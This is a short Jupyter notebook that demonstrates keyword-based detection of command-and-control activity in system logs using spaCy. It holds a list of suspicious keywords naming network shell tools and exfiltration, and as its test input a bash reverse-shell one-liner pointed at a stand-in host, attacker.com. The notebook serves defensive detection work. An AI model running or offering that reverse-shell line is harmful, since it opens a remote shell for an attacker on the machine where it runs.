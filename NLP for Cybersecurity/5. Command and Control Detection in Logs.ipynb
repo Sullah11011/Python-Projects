{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "40d173c6",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Install necessary libraries\n",
    "# pip install spacy\n",
    "\n",
    "import spacy\n",
    "\n",
    "# Load spaCy model for Named Entity Recognition\n",
    "nlp = spacy.load(\"en_core_web_sm\")\n",
    "\n",
    "# List of suspicious keywords related to C2 commands\n",
    "suspicious_keywords = [\"wget\", \"curl\", \"nc\", \"bash\", \"sh\", \"powershell\", \"download\", \"exfiltrate\"]\n",
    "\n",
    "def detect_command_control(log_entry: str) -> str:\n",
    "    \"\"\"\n",
    "    Detect suspicious commands related to command and control (C2) in system logs.\n",
    "    \"\"\"\n",
    "    doc = nlp(log_entry)\n",
    "    for token in doc:\n",
    "        if token.text.lower() in suspicious_keywords:\n",
    "            return \"Suspicious Command Detected!\"\n",
    "    return \"No Suspicious Command\"\n",
    "\n",
    "# Example usage\n",
    "log_entry = \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"\n",
    "result = detect_command_control(log_entry)\n",
    "print(result)\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
